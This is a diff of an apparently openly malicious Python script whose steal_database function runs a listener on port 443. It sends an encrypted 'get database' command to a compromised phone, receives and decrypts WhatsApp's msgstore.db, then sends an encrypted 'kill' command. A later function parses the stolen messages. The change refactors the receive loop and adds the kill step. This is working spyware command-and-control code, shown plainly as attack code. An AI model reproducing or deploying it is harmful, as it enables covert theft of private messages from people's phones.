@@ -22,26 +22,29 @@ def steal_database():
     s.bind(('', port))
     s.listen(1)
     print("Listening on port 443 for a connection from the phone")
-    count = 0 
-    while count < 1:
-        conn, addr = s.accept()
-        print('Got connection from: ', addr)
-        conn.send(ciphertext)
-        print("Encrypted 'get database' command sent to phone")
-        count += 1
-        with open("msgstore.db.enc", "wb") as db:
-            database = conn.recv(2048)
-            while database:
-                db.write(database)
-                database = conn.recv(2048)
+    conn, addr = s.accept()
+    print('Got connection from: ', addr)
+    conn.send(ciphertext)
+    print("Encrypted 'get database' command sent to phone")
+    with open("msgstore.db.enc", "wb") as db:
+        database = conn.recv(2048)
+        while database:
             db.write(database)
-        print("Encrypted database has been received")
-        with open('msgstore.db.enc', 'rb') as db_enc:
-            with open("msgstore.db", 'wb') as db:
-                enc_data = db_enc.read()
-                data = obj.decrypt(enc_data)
-                db.write(data)
-        print("Database has been decrypted")
+            database = conn.recv(2048)
+        db.write(database)
+    print("Encrypted database has been received")
+    with open('msgstore.db.enc', 'rb') as db_enc:
+        with open("msgstore.db", 'wb') as db:
+            enc_data = db_enc.read()
+            data = obj.decrypt(enc_data)
+            db.write(data)
+    print("Database has been decrypted")
+    kill_ciphertext =  obj.encrypt(b"kill" + b"\x00" * 12)
+    print("The kill command has been encrypted")
+    conn.send(kill_ciphertext)
+    print("The kill command has been sent to the phone")
+
+    
 # Parses WhatsApp message database and stores the messages in a dictionary
 def decode_whatsapp_messages():
     print("Starting to decode WhatsApp messages from the SQLite3 Database")
